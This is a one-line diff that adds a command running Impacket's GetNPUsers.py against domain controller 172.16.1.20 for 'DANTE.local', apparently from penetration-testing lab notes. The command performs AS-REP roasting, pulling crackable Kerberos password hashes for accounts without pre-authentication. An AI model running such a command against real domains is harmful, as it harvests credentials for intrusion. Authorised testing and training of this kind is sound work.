@@ -1,0 +1,1 @@
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 172.16.1.20 -request 'DANTE.local'
